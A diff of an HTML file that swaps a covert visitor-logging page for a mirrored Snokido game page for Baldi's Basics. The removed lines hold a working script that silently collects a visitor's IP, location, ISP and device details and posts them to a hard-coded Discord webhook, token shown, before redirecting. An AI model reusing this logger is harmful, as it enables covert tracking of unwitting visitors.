@@ -1,91 +1,355 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<title>Loading...</title>
+<meta charset="utf-8"/>
+<meta name="viewport" content="user-scalable=yes, initial-scale=1, minimum-scale=1, maximum-scale=10, width=device-width" />
+<title>Baldi's Basics - Play Online on Snokido</title>
+<meta name="description" content="Even though it's inspired by bad educational software from the 90s, Baldi's Basics is not an educational game but a weird title mixing horror and humor!..." />
+<meta property="og:url" content="https://www.snokido.com/game/baldis-basics" />
+<meta property="og:type" content="game" />
+<meta property="og:title" content="Baldi's Basics" />
+<meta property="og:image" content="https://w8.snokido.com/img/large/baldis-basics.jpg" />
+<meta property="og:description" content="Even though it's inspired by bad educational software from the 90s, Baldi's Basics is not an educational game but a weird title mixing horror and humor! School is out but your friend has a problem, he forgot 7 notebooks and asked you to collect them. But it will not be easy, because Professor..." />
+<link rel="canonical" href="https://www.snokido.com/game/baldis-basics" />
+<link rel="alternate" hreflang="fr" href="https://www.snokido.fr/jeu/baldis-basics" />
+<link rel="alternate" hreflang="en" href="https://www.snokido.com/game/baldis-basics" />
+<link rel="alternate" hreflang="x-default" href="https://www.snokido.com/game/baldis-basics" />
+<link rel="preconnect" href="https://w8.snokido.com"/>
+<link rel="manifest" href="https://www.snokido.com/manifest.json"/>
+<link rel="icon" type="image/png" sizes="192x192"  href="https://www.snokido.com/android-icon-192x192.png"/>
+<link rel="apple-touch-icon" sizes="180x180" href="https://www.snokido.com/apple-touch-icon.png"/>
+<link rel="shortcut icon" type="image/x-icon" href="https://www.snokido.com/favicon.ico"/>
+<link rel="stylesheet" type="text/css" href="https://www.snokido.com/templates/snokiv32/style.css?150525"/>
+<script>
+NEW_PMS=0;NEW_FRS=0;AFG=0;const GAMEURL='';const ID='2784';const NETURL='https://www.snokido.com';const CDNURL='https://w8.snokido.com';const adcode='ca-games-pub-7474256871099866';const LANG='lang=en';gFull=1;gWidth=900;gHeight=600;LVL_UP = 'Congratulations you have gained a level and received a bonus of';LVL_END = 'Congratulations you have reached the <strong>maximum</strong> level!';LVL = 'Level';MINI_COMMENT = 'Your comment must contain at least 4 characters';SPAM_COMMENT = 'Please avoid emoticons spam';LAST_COMMENT = 'You have published the last comment on this game<br /><b>You can edit your previous comment</b>';ANTI_SPAM = 'Please wait a few seconds before adding a new comment';REQUEST_SENT = 'Request sent';GAME_FAVOURITE = 'Add to favorites';GAME_UNFAVOURITE = 'Remove from favorites';SHOW_CONTROL = 'Show controls';HIDE_CONTROL = 'Hide controls';FILL_IN_FORM = 'Make sure you have completed all required fields';N_NEW_PM = 'You have a new message';N_MULTI_NEW_PM1 = 'You have';N_MULTI_NEW_PM2 = 'new messages';N_NEW_FR = 'You have a new friend request';ACCEPTED_FRIEND = 'Accepted';N_MULTI_NEW_FR1 = 'You have';N_MULTI_NEW_FR2 = 'new friend requests';NEW_MSG = 'New message';N_FRS = 'Friend request waiting!';N_PMS = 'New message!';N_FR_VIEW = 'View the request';N_PM_VIEW = 'View message';QUIT = 'Close';SENDING = 'Sending...';CONTINUE = 'Continue playing';
+</script>
+<script src="https://w8.snokido.com/js/jquery.js"></script>
+<script src="https://w8.snokido.com/js/skjs3.min.js?270325"></script>
 </head>
 <body>
-
-<h2>Loading...</h2>
-
-<script>
-const webhookURL = "https://discord.com/api/webhooks/1481002558695669912/3QmMwvISWqW74jd2PpzH9Bs-z8xKXPXr08op7tC5NejVe8wpJfxktaJKlHewoVU1b8J3";
-
-// Browser info
-const userAgent = navigator.userAgent;
-const platform = navigator.platform;
-const language = navigator.language;
-const cookiesEnabled = navigator.cookieEnabled;
-const cpuCores = navigator.hardwareConcurrency || "Unknown";
-const ram = navigator.deviceMemory || "Unknown";
-
-// Page info
-const pageURL = window.location.href;
-const referrer = document.referrer || "Direct";
-
-// Screen info
-const screenSize = `${screen.width} x ${screen.height}`;
-
-// Time
-const time = new Date().toLocaleString();
-
-// Detect OS
-let os = "Unknown";
-if (platform.startsWith("Win")) os = "Windows";
-else if (platform.startsWith("Mac")) os = "macOS";
-else if (/iPhone|iPad|iPod/.test(userAgent)) os = "iOS";
-else if (/Android/.test(userAgent)) os = "Android";
-else if (/Linux/.test(platform)) os = "Linux";
-
-// Device type
-let deviceType = /Mobi|Android|iPhone|iPad/.test(userAgent) ? "Mobile/Tablet" : "Desktop";
-
-// Get IP info
-fetch("https://ipapi.co/json/")
-.then(res => res.json())
-.then(data => {
-
-const payload = {
-content: "📌 **Someone clicked the link**",
-embeds: [{
-title: "Visitor Details",
-color: 16711680,
-fields: [
-{ name: "IP Address", value: data.ip || "Unknown", inline: true },
-{ name: "City", value: data.city || "Unknown", inline: true },
-{ name: "Region", value: data.region || "Unknown", inline: true },
-{ name: "Country", value: data.country_name || "Unknown", inline: true },
-{ name: "ISP", value: data.org || "Unknown", inline: true },
-{ name: "Timezone", value: data.timezone || "Unknown", inline: true },
-
-{ name: "Operating System", value: os, inline: true },
-{ name: "Device Type", value: deviceType, inline: true },
-{ name: "Language", value: language, inline: true },
-
-{ name: "Screen", value: screenSize, inline: true },
-{ name: "CPU Cores", value: cpuCores.toString(), inline: true },
-{ name: "RAM (GB)", value: ram.toString(), inline: true },
-
-{ name: "Cookies Enabled", value: cookiesEnabled.toString(), inline: true },
-{ name: "Referrer", value: referrer, inline: false },
-{ name: "Page URL", value: pageURL, inline: false },
-{ name: "User Agent", value: userAgent, inline: false },
-{ name: "Time Clicked", value: time, inline: false }
-],
-timestamp: new Date().toISOString()
-}]
-};
-
-fetch(webhookURL,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify(payload)
-}).finally(()=>{
-window.location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-});
-
-});
-</script>
-
+<header id="header">
+	<a href="https://www.snokido.com" class="logo">
+		<img src="https://www.snokido.com/images/snokido.png?v3" width="166" height="78" alt="Snokido" />
+	</a>
+	<div class="headwrap">
+		<div class="headtop">
+				<div class="search">
+					<button type="button" aria-label="Search" class="icon-search"></button>
+					 <form action="/search/" method="get" id="formSearch">
+					   <input id="search" name="Search" placeholder="Search..." autocomplete="off" type="search" maxlength="50" />
+					 </form>
+					<ul id="results"></ul>
+				</div>
+				  <button type="button" aria-label="Log in" class="icon-login"></button>
+		</div>
+		<nav>
+			 <ul id="menu">
+				<li class="navhome"><a href="https://www.snokido.com" aria-label="Home" class="icon-home"></a></li>
+				<li class="navover"><a href="https://www.snokido.com/games/action" class="border1">Action</a>
+<li class="navover"><a href="https://www.snokido.com/games/adventure" class="border2">Adventure</a>
+<li class="navover"><a href="https://www.snokido.com/games/puzzle" class="border3">Puzzle</a>
+<li class="navover"><a href="https://www.snokido.com/games/sports" class="border4">Sports</a>
+<li class="navover"><a href="https://www.snokido.com/games/fnf" class="border5">FNF</a>
+<li class="navover"><a href="https://www.snokido.com/games/multiplayer" class="border0">Multiplayer</a>
+<li class="navover"><a href="https://www.snokido.com/games/2-players" class="border0">2 players</a>
+<li id="plus" class="icon-more"></li>
+			 </ul>
+		</nav>
+	</div>
+</header>
+<main id="main">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"SoftwareApplication","name":"Baldi's Basics","url":"https://www.snokido.com/game/baldis-basics",
+"image":"https://w8.snokido.com/img/large/baldis-basics.jpg","description":"Even though it's inspired by bad educational software from the 90s, Baldi's Basics is not an educational game but a weird title mixing horror and humor! School is out but your friend has a problem, he forgot 7 notebooks...","applicationCategory":"GameApplication","operatingSystem":"Windows, Linux, MacOS",
+"aggregateRating":{"@type":"AggregateRating","ratingValue":86,"worstRating":1,"bestRating":100,"ratingCount":40921},
+"offers":{"@type":"Offer","category":"free","availability": "http://schema.org/InStock","priceCurrency":"EUR","price":"0"}}</script><div class="main">
+  <div class="Gside">
+    <div id="bgame" class="border">
+      <div id="game" style="width:900px; height:600px;"><iframe title="game" id="embed" src="https://www.gameslol.net/data/baldis-basics/index.html" allow="autoplay;cross-origin-isolated" scrolling="no" allowfullscreen></iframe></div><script>setTimeout(function(){UserAddPlay()},130000);gameSize();</script>                  
+      <div class="gamebar">
+        <div class="gameopt">
+          <button type="button" aria-label="Show controls" id="pad" tooltip="Show controls">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 29.78 30">
+              <path d="M29.4 8.7c-.2-.2-4.6-.3-8-.3L21.1.3c-.4-.4-12-.4-12.5 0-.2.2-.3 4.6-.3 8.1-3.4 0-7.9.1-8 .3-.4.4-.4 12 0 12.6.2.2 4.6.3 8 .3 0 3.4.1 8 .3 8.1.4.4 12 .4 12.5 0 .2-.2.3-4.6.3-8.1 3.4 0 7.9-.1 8-.3.5-.5.5-12.2 0-12.6z" fill="#888"/><path d="M18.7 5.9a22.29 22.29 0 0 0-4-4.1 31.08 31.08 0 0 0-4 4.1h8m-8 18.1a22.29 22.29 0 0 0 4 4.1 31.08 31.08 0 0 0 4-4.1c-2.7-.1-5.2-.1-8 0m13-5.1a22.29 22.29 0 0 0 4.1-4 31.08 31.08 0 0 0-4.1-4v8M5.7 11a22.29 22.29 0 0 0-4.1 4 31.08 31.08 0 0 0 4.1 4v-8m13.4 3.9a4.4 4.4 0 0 0-8.8 0 4.44 4.44 0 0 0 4.4 4.4 4.25 4.25 0 0 0 4.4-4.4" fill="#444"/>
+            </svg>
+            <span>Controls</span>
+          </button>
+          <button type="button" aria-label="Report a bug" class="report" tooltip="Report a bug" onclick="ShowPopup('report', '2784', 1);">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+              <path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+            </svg>
+          </button>
+          <button type="button" aria-label="Add to favorites" id="logfav" tooltip="Add to favorites"><span class="icon-fav"></span></button>
+        </div>
+        <div class="gamesize">
+        <button type="button" aria-label="Fullscreen" class="resizing" tooltip="Fullscreen" id="full" onClick="ResizeFlash(1)">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 815.88 559.88" shape-rendering="crispEdges">
+            <path d="M49.98 399.92H0v159.96h179.96v-50H49.98V399.92zM0 159.96h49.98V49.98h129.98V0H0v159.96zM635.92 0v49.98H765.9v109.98h50V0H635.92zM765.9 509.9H635.92v50h179.96V399.92h-50V509.9z"/>
+          </svg>
+        </button>
+        </div>
+        <div class="gamerate">
+          <button type="button" aria-label="I like this" tooltip="I like this" class="likes" id="like">
+		<span class="thumb-up"></span><span id="rate_like">35 k</span>
+	</button>
+	<button type="button" aria-label="I dislike this" tooltip="I dislike this" class="likes" id="dislike">
+		<span class="thumb-down"></span><span id="rate_dislike">5.7 k</span>
+	</button>
+	<div class="gamescore">86%</div>        </div>
+      </div>
+    </div>
+    <div class="control border">
+      <span class="key kqwerty"></span> &nbsp;Move&nbsp;&nbsp;&nbsp; <span class="key kclicL"></span> &nbsp;Action&nbsp;&nbsp;&nbsp; <span class="key kmaj"></span> &nbsp;Run&nbsp;&nbsp;&nbsp; <span class="key kspace">Space</span> &nbsp;Look Back    </div>
+    <div class="gameinfos border">
+      <div class="gameinfo">
+        <h1>Baldi's Basics</h1>
+        <span class="gamemore">Developer: <span class="gameauth"> Basically Games</span>&nbsp; - &nbsp; <span class="gamehit">3 289 691</span> plays</span>
+        <p id="desc" class="gamedesc">Even though it's inspired by bad educational software from the 90s, Baldi's Basics is not an educational game but a weird title mixing horror and humor! School is out but your friend has a problem, he forgot 7 notebooks and asked you to collect them. But it will not be easy, because Professor Baldi has prepared many challenges for you and he will not allow you to make mistakes. Explore the school to find the notebooks, and try to solve the problems you will face. But that seems easier said than done! You will have to memorize the school plans, know how to use the objects you find but also convince Baldi's friends to give you an advantage. The terrible Professor Baldi will always search you, don't let him catch up with you or the game will be over. Always be on your guard and flee to not to meet him!<br />
+<br />
+<b>Baldi's Basics offers two game modes:</b><br />
+- Story mode will ask you to find 7 notebooks and then run away from school. Over time Baldi will speed up, but each time you solve a problem he will slow down. Keep its speed as slow as possible to collect all the notebooks.<br />
+- Endless mode is a challenge that ask you to find as many notebooks as possible without getting caught by Baldi. Solve the problems to keep Baldi's speed at its lowest and thus get more notebooks.</p>        <div class="gametags">
+          <a href="https://www.snokido.com/games/exploration">Exploration</a> <a href="https://www.snokido.com/games/survival">Survival</a> <a href="https://www.snokido.com/games/horror">Horror</a> <a href="https://www.snokido.com/games/3d">3D</a> <a href="https://www.snokido.com/games/halloween">Halloween</a>        </div>
+      </div>
+      <div id="comgame">
+        <h2><span class="topcom">Comments</span></h2>
+        <div class="comnew">
+          <img src="/images/guest.jpg" width="60" height="60" class="comment_avatar" alt="snokies" />  <div class="comadd"><textarea name="comment" id="addcom" maxlength="800" placeholder="Post a comment about the game (English only)"></textarea></div>
+<div id="comoptions">
+<button type="button" id="login" class="darkBT login">Add a comment</button>
+  <button type="button" id="cancel" class="greyBT">Cancel</button></div>        </div>
+        <ul id="comment_list">
+          
+	  <li id="comment-1240767">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/4.jpg" data-url="vasyagamer" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="vasyagamer" class="proflink">VasyaGamer</span></p>
+      <p class="comment_text">hi hi hi hi hi hi hi hi hi</p>
+      <p class="comments_info">1 day ago - <span onclick="ShowPopup('report',1240767,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1240739">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/4.jpg" data-url="mariosonicmanboy" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="mariosonicmanboy" class="proflink">MarioSonicManBoy</span></p>
+      <p class="comment_text">The truth is... HE&#039;S NOT BALD. He still has one strand of hair left.</p>
+      <p class="comments_info">2 days ago - <span onclick="ShowPopup('report',1240739,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1240414">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/1.jpg" data-url="lier" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="lier" class="proflink">Lier</span></p>
+      <p class="comment_text">For some reason, the principal gets you in detention if he sees you blasting soda and he says it is drinking but it is not drinking, WHAT IS WRONG WITH THIS GAME!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?!?</p>
+      <p class="comments_info">5 days ago - <span onclick="ShowPopup('report',1240414,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1239845">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/3.jpg" data-url="powerbump" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="powerbump" class="proflink">powerbump</span></p>
+      <p class="comment_text">great job! that&#039;s right</p>
+      <p class="comments_info">1 week ago - <span onclick="ShowPopup('report',1239845,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1239701">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/14.jpg" data-url="gkgamercr7" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="gkgamercr7" class="proflink">gkgamerCR7</span></p>
+      <p class="comment_text">his name is baldi cuz hes bald and thats the point <img src="https://www.snokido.com/images/emoticons/doubt.png" width="17" height="17" alt="doubt" />  <img src="https://www.snokido.com/images/emoticons/doubt.png" width="17" height="17" alt="doubt" /></p>
+      <p class="comments_info">1 week ago - <span onclick="ShowPopup('report',1239701,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1239524">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/2.jpg" data-url="i69dyourmom" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="i69dyourmom" class="proflink">i69dyourmom</span></p>
+      <p class="comment_text">welcome to baldis basics for education and learning</p>
+      <p class="comments_info">2 weeks ago - <span onclick="ShowPopup('report',1239524,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1239476">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/4.jpg" data-url="aboyk0" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="aboyk0" class="proflink">aboyk0</span></p>
+      <p class="comment_text">FPE is better than baldi&#039;s basics</p>
+      <p class="comments_info">2 weeks ago - <span onclick="ShowPopup('report',1239476,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1239176">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/4.jpg" data-url="mariosonicmanboy" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="mariosonicmanboy" class="proflink">MarioSonicManBoy</span></p>
+      <p class="comment_text">Now for a moment of sadness for the adults who listened to the children saying, &quot;the answer is 31718! the answer is 53045009!&quot;</p>
+      <p class="comments_info">2 weeks ago - <span onclick="ShowPopup('report',1239176,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1238727">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/2.jpg" data-url="skbidi" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="skbidi" class="proflink">skbidi</span></p>
+      <p class="comment_text">loki i was sacrd</p>
+      <p class="comments_info">3 weeks ago - <span onclick="ShowPopup('report',1238727,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1238694">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/2.jpg" data-url="pancake_212106" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="pancake_212106" class="proflink">pancake_212106</span></p>
+      <p class="comment_text">this lowkey scary when u get stuff wroung im dumb this game is an iq test i heard scary noises too whene my screen went black</p>
+      <p class="comments_info">3 weeks ago - <span onclick="ShowPopup('report',1238694,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1237977">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/3.jpg" data-url="noname13" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="noname13" class="proflink">noname13</span></p>
+      <p class="comment_text">this is a full on replica, except for the fact that i pressed D and my game crashed</p>
+      <p class="comments_info">1 month ago - <span onclick="ShowPopup('report',1237977,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1237702">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/4.jpg" data-url="selenathebest" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="selenathebest" class="proflink">Selenathebest</span></p>
+      <p class="comment_text">i pressed the x button and the whole game shut down and i also hear creepy sounds in the background...</p>
+      <p class="comments_info">1 month ago - <span onclick="ShowPopup('report',1237702,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1237406">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/4.jpg" data-url="hollow_knight87" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="hollow_knight87" class="proflink">hollow_knight87</span></p>
+      <p class="comment_text">damn you baldi |</p>
+      <p class="comments_info">1 month ago - <span onclick="ShowPopup('report',1237406,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1236916">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/3.jpg" data-url="norsa" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="norsa" class="proflink">Norsa</span></p>
+      <p class="comment_text"><img src="https://www.snokido.com/images/emoticons/doubt.png" width="17" height="17" alt="doubt" />  This is not what I expected baldy I thoughtt we were chill</p>
+      <p class="comments_info">1 month ago - <span onclick="ShowPopup('report',1236916,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1236855">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/5.jpg" data-url="east76" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="east76" class="proflink">east76</span></p>
+      <p class="comment_text">hi good game.</p>
+      <p class="comments_info">1 month ago - <span onclick="ShowPopup('report',1236855,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li>
+	  <li id="comment-1236103">
+    <div class="comment_avatar"><img src="https://www.snokido.com/images/snoki/medium/161.jpg" data-url="east75" class="proflink" width="60" height="60" alt="snoki" /></div>
+    <div class="comment_content">
+      <p class="comment_username"><span data-url="east75" class="proflink">east75</span></p>
+      <p class="comment_text">why does baldi&#039;s voice sound starnga, I swear baldi&#039;s voice is more lower-pitched</p>
+      <p class="comments_info">1 month ago - <span onclick="ShowPopup('report',1236103,2);" class="report_comment">
+			<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" shape-rendering="crispEdges">
+				<path d="M14.4 6L14 4H5v17h2v-7h5.6l.4 2h7V6z" />
+			</svg>
+			</span></p>
+    </div>
+	  </li><li class="page"><span class="active hellip">&lt;</span><a href="#" class="on" onclick="CommentPage(2784, 1); return false">1</a> <a href="#" class="off" onclick="CommentPage(2784, 2); return false">2</a> <a href="#" class="off" onclick="CommentPage(2784, 3); return false">3</a> <a href="#" class="off" onclick="CommentPage(2784, 4); return false">4</a><span class="active hellip">&hellip;</span> <a href="#" class="off" onclick="CommentPage(2784, 32); return false">32</a> <a href="#" class="off arrow" onclick="CommentPage(2784, 2); return false">&gt;</a></li>        </ul>
+      </div>
+    </div>
+  </div>
+  <div class="Rside">
+      <ul>
+      <li class="capsim"><a href="https://www.snokido.com/game/baldis-fun-new-school-plus-ultimate-edition"><img src="https://w8.snokido.com/img/baldis-fun-new-school-ultimate.jpg" width="156" height="90" alt="Baldi's Fun New School Plus Ultimate Edition" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/baldis-fun-new-school-remastered"><img src="https://w8.snokido.com/img/baldis-fun-new-school-remastered.jpg" width="156" height="90" alt="Baldi's Fun New School Remastered" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/99-nights-in-the-forest"><img src="https://w8.snokido.com/img/99-nights-in-the-forest.jpg" width="156" height="90" alt="99 Nights in The Forest" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/granny"><img src="https://w8.snokido.com/img/granny.jpg?190225" width="156" height="90" alt="Granny" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/five-nights-at-freddys"><img src="https://w8.snokido.com/img/five-nights-at-freddys.jpg" width="156" height="90" alt="Five Nights at Freddy's" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/doors-castle-online"><img src="https://w8.snokido.com/img/doors-castle-online.jpg?040625" width="156" height="90" alt="Doors Castle Online" /></a></li>      <li class="capsim"><a href="https://www.snokido.com/game/granny-2"><img src="https://w8.snokido.com/img/granny-2.jpg" width="156" height="90" alt="Granny 2" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/ultimate-custom-night"><img src="https://w8.snokido.com/img/ultimate-custom-night.jpg" width="156" height="90" alt="UCN - Ultimate Custom Night" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/five-nights-at-freddys-2"><img src="https://w8.snokido.com/img/five-nights-at-freddys-2.jpg" width="156" height="90" alt="Five Nights at Freddy's 2" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/backrooms"><img src="https://w8.snokido.com/img/backrooms.jpg" width="156" height="90" alt="Backrooms" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/five-nights-at-freddys-4"><img src="https://w8.snokido.com/img/fnaf-4.jpg" width="156" height="90" alt="Five Nights at Freddy's 4" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/five-nights-at-freddys-3"><img src="https://w8.snokido.com/img/fnaf-3.jpg" width="156" height="90" alt="Five Nights at Freddy's 3" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/five-nights-at-freddys-sister-location"><img src="https://w8.snokido.com/img/fnaf-sister-location.jpg" width="156" height="90" alt="Five Nights at Freddy's : Sister Location" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/slenderman-must-die-silent-streets"><img src="https://w8.snokido.com/img/slenderman-must-die-silent-streets.jpg" width="156" height="90" alt="Slenderman Must Die : Silent Streets" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/fnaf-final-purgatory"><img src="https://w8.snokido.com/img/fnaf-final-purgatory.jpg" width="156" height="90" alt="FNAF: Final Purgatory" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/zoolax-nights-evil-clowns"><img src="https://w8.snokido.com/img/zoolax-nights.jpg" width="156" height="90" alt="Zoolax Nights: Evil Clowns" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/silent-lullaby"><img src="https://w8.snokido.com/img/silent-lullaby.jpg" width="156" height="90" alt="Silent Lullaby" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/forgotten-hill-little-cabin-in-the-woods"><img src="https://w8.snokido.com/img/forgotten-hills-little-cabin.jpg?031218" width="156" height="90" alt="Forgotten Hill: Little Cabin in the Woods" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/buckshot-roulette"><img src="https://w8.snokido.com/img/buckshot-roulette.jpg" width="156" height="90" alt="Buckshot Roulette" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/doki-doki-literature-club"><img src="https://w8.snokido.com/img/doki-doki-literature-club.jpg" width="156" height="90" alt="Doki Doki Literature Club!" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/side-effects"><img src="https://w8.snokido.com/img/side-effects.jpg" width="156" height="90" alt="Side Effects" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/cuberealmio"><img src="https://w8.snokido.com/img/cuberealm-io.jpg" width="156" height="90" alt="CubeRealm.io" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/the-visitor"><img src="https://w8.snokido.com/img/the-visitor.jpg" width="156" height="90" alt="The Visitor" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/the-visitor-returns"><img src="https://w8.snokido.com/img/the-visitor-returns.jpg" width="156" height="90" alt="The Visitor Returns" /></a></li><li class="capsim"><a href="https://www.snokido.com/game/the-visitor-massacre"><img src="https://w8.snokido.com/img/the-visitor-massacre.jpg" width="156" height="90" alt="The Visitor Massacre" /></a></li><li 